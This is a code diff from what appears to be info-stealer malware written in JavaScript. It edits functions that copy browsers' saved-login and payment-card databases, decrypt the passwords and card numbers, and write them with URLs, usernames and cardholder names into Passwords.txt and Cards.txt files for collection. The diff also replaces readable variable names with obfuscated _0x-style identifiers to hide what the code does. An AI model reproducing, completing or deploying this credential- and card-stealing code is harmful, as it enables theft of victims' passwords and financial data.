@@ -3496,59 +3496,82 @@ async function inject(appPath, asarPath, injectionUrl, licensePath) {
 
 
 async function getPasswords() {
-  const results = [];
+  const _0x540754 = [];
 
-  for (let i = 0; i < browserPath.length; i++) {
-    if (!fs.existsSync(browserPath[i][0])) continue;
+  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
+    if (!fs.existsSync(browserPath[_0x261d97][0])) continue;
 
-    let appName;
-    if (browserPath[i][0].includes('Local')) {
-      appName = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
+    let _0xd541c2;
+    if (browserPath[_0x261d97][0].includes('Local')) {
+      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
     } else {
-      appName = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
+      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
     }
 
-    const loginDataPath = path.join(browserPath[i][0], 'Login Data');
-    const tempDbPath = path.join(browserPath[i][0], 'passwords.db');
+    const _0x256bed = path.join(browserPath[_0x261d97][0], 'Login Data');
+    const _0x239644 = path.join(browserPath[_0x261d97][0], 'passwords.db');
 
-    fs.copyFileSync(loginDataPath, tempDbPath);
-    const db = new sqlite3.Database(tempDbPath);
+    fs.copyFileSync(_0x256bed, _0x239644);
+    const _0x3d71cb = new sqlite3.Database(_0x239644);
 
-    await new Promise((resolve) => {
-      db.each(
+    await new Promise((_0x2c148b) => {
+      _0x3d71cb.each(
         'SELECT origin_url, username_value, password_value, date_created FROM logins',
-        (err, row) => {
-          if (err || !row.username_value || !row.password_value) return;
+        (_0x4c7a5b, _0x504e35) => {
+          if (_0x4c7a5b || !_0x504e35.username_value || !_0x504e35.password_value) return;
 
           try {
-            const encryptedPassword = row.password_value;
-            const iv = encryptedPassword.slice(3, 15);
-            const ciphertext = encryptedPassword.slice(15, encryptedPassword.length - 16);
-            const authTag = encryptedPassword.slice(encryptedPassword.length - 16);
+            const _0x3d2b4b = _0x504e35.password_value;
+            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
+            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
+            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16);
 
-            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
-            decipher.setAuthTag(authTag);
-            const password = decipher.update(ciphertext) + decipher.final();
-
-            const dateCreated = new Date(row.date_created / 1000 - 11644473600 * 1000).toLocaleString();
-
-            results.push(
-              `================\nURL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: ${password}\nDate Created: ${dateCreated}\nApplication: ${appName} ${browserPath[i][1]}\n`
+            const _0x210aeb = crypto.createDecipheriv(
+              'aes-256-gcm',
+              browserPath[_0x261d97][3],
+              _0x5e1041
             );
-          } catch (err) {
-            results.push(`================\nURL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: [Decryption Failed]\n`);
+            _0x210aeb.setAuthTag(_0x2a933a);
+            const password =
+              _0x210aeb.update(_0x279e1b) + _0x210aeb.final();
+
+            const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();
+
+            _0x540754.push(
+              '================\nURL: ' +
+              _0x504e35.origin_url +
+              '\nUsername: ' +
+              _0x504e35.username_value +
+              '\nPassword: ' +
+              password +
+              '\nDate Created: ' +
+              dateCreated +
+              '\nApplication: ' +
+              _0xd541c2 +
+              ' ' +
+              browserPath[_0x261d97][1] +
+              '\n'
+            );
+          } catch (_0x5bf37a) {
+            _0x540754.push(
+              '================\nURL: ' +
+              _0x504e35.origin_url +
+              '\nUsername: ' +
+              _0x504e35.username_value +
+              '\nPassword: [Decryption Failed]\n'
+            );
           }
         },
-        () => resolve()
+        () => _0x2c148b('')
       );
     });
 
-    db.close();
-    fs.unlinkSync(tempDbPath);
+    _0x3d71cb.close();
+    fs.unlinkSync(_0x239644);
   }
 
-  if (results.length === 0) {
-    results.push('no password found for ');
+  if (_0x540754.length === 0) {
+    _0x540754.push('no password found for ');
   }
 
   const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
@@ -3557,16 +3580,15 @@ async function getPasswords() {
   }
 
   const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
-  fs.writeFileSync(passwordsFilePath, user.copyright + results.join(''), {
+  fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
     encoding: 'utf8',
     flag: 'a+',
   });
 }
 
 
-
 async function getCards() {
-  const results = [];
+  const _0x540754 = [];
 
   for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
     if (!fs.existsSync(browserPath[_0x261d97][0])) {
@@ -3601,7 +3623,7 @@ async function getCards() {
               const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
               const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
               const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
-              results.push(cardInfo);
+              _0x540754.push(cardInfo);
             } catch (error) {}
           }
         },
@@ -3617,18 +3639,18 @@ async function getCards() {
     } catch (error) {}
   }
 
-  if (results.length === 0) {
-    results.push('no cards found');
+  if (_0x540754.length === 0) {
+    _0x540754.push('no cards found');
   }
 
-  if (results.length) {
+  if (_0x540754.length) {
     const cardsFolderPath = path.join(mainFolderPath, 'Cards');
     if (!fs.existsSync(cardsFolderPath)) {
       fs.mkdirSync(cardsFolderPath);
     }
 
     const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
-    fs.writeFileSync(cardsFilePath, user.copyright + results.join(''), {
+    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
       encoding: 'utf8',
       flag: 'a+',
     });
